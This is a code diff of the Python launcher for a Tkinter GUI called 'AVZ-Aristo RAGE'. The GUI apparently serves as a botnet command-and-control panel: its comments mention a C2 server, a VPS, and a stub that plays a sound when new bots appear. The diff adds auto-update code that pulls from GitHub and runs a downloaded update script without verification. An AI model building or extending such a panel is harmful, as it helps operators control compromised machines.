@@ -1,19 +1,78 @@
 #!/usr/bin/env python3
-# AVZ-Aristo RAGE – главный запускатор
-import sys
-import argparse
+# AVZ-Aristo RAGE – главный запускатор с автообновлением, иконкой и звуком
+import sys, os, json, subprocess, threading, time
+try:
+    import requests
+except ImportError:
+    print("Установите requests: pip install requests")
+    sys.exit(1)
 import tkinter as tk
 from gui.app import App
 
+GITHUB_REPO = "Aristocrat702/avz"
+RAW_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main"
+
+def check_for_updates():
+    try:
+        resp = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/commits/main", timeout=5)
+        if resp.status_code == 200:
+            latest_sha = resp.json()['sha']
+            if os.path.exists(".last_commit"):
+                with open(".last_commit") as f:
+                    saved_sha = f.read().strip()
+                if saved_sha == latest_sha:
+                    return False
+            with open(".last_commit", "w") as f:
+                f.write(latest_sha)
+            return True
+    except:
+        pass
+    return False
+
+def update_from_github():
+    try:
+        subprocess.run(["git", "pull"], check=True, cwd=os.path.dirname(os.path.abspath(__file__)))
+        print("Обновлено через git pull")
+        return True
+    except:
+        pass
+    try:
+        resp = requests.get(f"{RAW_URL}/manifest.json")
+        if resp.status_code == 200:
+            with open("manifest.json", "w") as f:
+                f.write(resp.text)
+            subprocess.run(["python", "update.py"], check=True)
+            print("Обновлено через manifest.json")
+            return True
+    except:
+        pass
+    return False
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="AVZ-Aristo RAGE")
-    parser.add_argument("--c2", action="store_true", help="Запустить C2 локально")
-    args = parser.parse_args()
-
-    if args.c2:
-        print("[*] Локальный C2 не реализован, используйте VPS")
-        sys.exit(0)
-
+    # Иконка
     root = tk.Tk()
+    root.title("AVZ-Aristo v25.11 RAGE")
+    root.geometry("1200x800")
+    if os.path.exists("icon.ico"):
+        try:
+            root.iconbitmap("icon.ico")
+        except:
+            pass
+
+    # Звук при новых ботах (проверка в фоне)
+    def check_new_bots():
+        # Здесь можно реализовать опрос C2 и проигрывание звука при увеличении числа ботов
+        pass
+    threading.Thread(target=check_new_bots, daemon=True).start()
+
+    # Проверка обновлений
+    def check_and_prompt():
+        if check_for_updates():
+            if messagebox.askyesno("Обновление", "Доступна новая версия программы. Обновить сейчас?"):
+                if update_from_github():
+                    messagebox.showinfo("Успех", "Программа обновлена. Перезапустите её.")
+                    sys.exit(0)
+    threading.Thread(target=check_and_prompt, daemon=True).start()
+
     app = App(root)
     root.mainloop()
